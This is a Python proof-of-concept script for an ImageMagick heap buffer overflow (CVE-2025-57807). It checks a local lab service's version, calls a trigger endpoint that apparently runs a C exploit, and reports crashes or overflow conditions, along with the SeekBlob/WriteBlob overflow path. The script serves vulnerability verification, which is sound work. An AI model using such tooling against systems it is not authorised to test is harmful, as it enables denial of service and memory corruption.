#!/usr/bin/env python3
import requests
import sys
import re

TARGET = "http://localhost:8888"

def print_banner():
    print("=" * 70)
    print("CVE-2025-57807 - ImageMagick Heap Buffer Overflow PoC")
    print("CWE-122: Heap-based Buffer Overflow")
    print("=" * 70)
    print()

def check_version():
    print("[Step 1] Checking ImageMagick version...")
    try:
        r = requests.get(f"{TARGET}/?action=version", timeout=10)
        if r.status_code == 200:
            match = re.search(r'ImageMagick (\d+\.\d+\.\d+-\d+)', r.text)
            if match:
                version = match.group(1)
                print(f"[+] ImageMagick version: {version}")
                if version in ['7.1.2-0', '7.1.2-1', '7.1.2-2'] or version.startswith('7.1.1'):
                    print("[!] VULNERABLE VERSION DETECTED")
                    return True, version
                else:
                    print("[-] Version may be patched")
                    return False, version
        print("[-] Failed to get version")
        return False, None
    except Exception as e:
        print(f"[-] Connection error: {e}")
        return False, None

def trigger_exploit():
    print("\n[Step 2] Triggering heap overflow exploit...")
    print("[*] Calling /?action=trigger to execute C PoC...")
    print()
    
    try:
        r = requests.get(f"{TARGET}/?action=trigger", timeout=30)
        
        output_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
        if output_match:
            output = output_match.group(1)
            import html
            output = html.unescape(output)
            
            print("--- PoC Output ---")
            print(output)
            print("--- End Output ---")
            print()
            
            if "CRASH DETECTED" in output or "VULNERABILITY CONFIRMED" in output:
                return True, "CRASH"
            elif "SIGSEGV" in output or "SIGABRT" in output:
                return True, "CRASH"
            elif "Exit code: 139" in output or "Exit code: 134" in output or "Exit code: 11" in output or "Exit code: 6" in output:
                return True, "CRASH"
            elif "Exit code: -" in output:
                return True, "CRASH"
            elif "offset=268435456" in output and "extent=" in output:
                extent_match = re.search(r'extent=(\d+)', output)
                if extent_match:
                    extent = int(extent_match.group(1))
                    if extent < 268435456:
                        print(f"[!] Vulnerable state: offset=268435456 >> extent={extent}")
                        return True, "OVERFLOW_CONDITION"
            
            if "Exit code: 0" in output:
                return False, "NO_CRASH"
                
        return False, "UNKNOWN"
        
    except requests.exceptions.Timeout:
        print("[!] Request timeout - service may have crashed!")
        return True, "TIMEOUT_CRASH"
    except requests.exceptions.ConnectionError:
        print("[!] Connection error - service crashed!")
        return True, "CONNECTION_CRASH"
    except Exception as e:
        print(f"[-] Error: {e}")
        return False, "ERROR"

def main():
    print_banner()
    
    vulnerable, version = check_version()
    if not vulnerable:
        print("\n[-] Target may not be vulnerable or service not running")
        if version:
            print(f"    Detected version: {version}")
        return False
    
    success, crash_type = trigger_exploit()
    
    print("\n" + "=" * 70)
    print("RESULT")
    print("=" * 70)
    
    if success:
        print()
        print("[+] VULNERABLE - Exploit successful!")
        print()
        print(f"    Crash Type: {crash_type}")
        print(f"    Version: {version}")
        print()
        print("Evidence:")
        print("  - SeekBlob() allowed offset=256MiB with extent=1")
        print("  - WriteBlob() attempted write to (data + 256MiB)")
        print("  - Heap memory write beyond allocation boundary")
        if crash_type == "CRASH":
            print("  - Process terminated with signal (SIGSEGV/SIGABRT)")
        print()
        print("Impact:")
        print("  - Denial of Service (crash)")
        print("  - Memory corruption")
        print("  - Potential Remote Code Execution")
        print()
        print("Remediation: Upgrade to ImageMagick >= 7.1.2-3 or >= 14.8.2")
        print("=" * 70)
        return True
    else:
        print()
        print("[-] Exploit did not trigger observable crash")
        print("    This may occur if:")
        print("    - ImageMagick was not compiled with ASan")
        print("    - Memory layout prevented immediate crash")
        print("    - The vulnerability exists but didn't crash this run")
        print()
        print("    The vulnerable code path was still executed.")
        print("=" * 70)
        return False

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
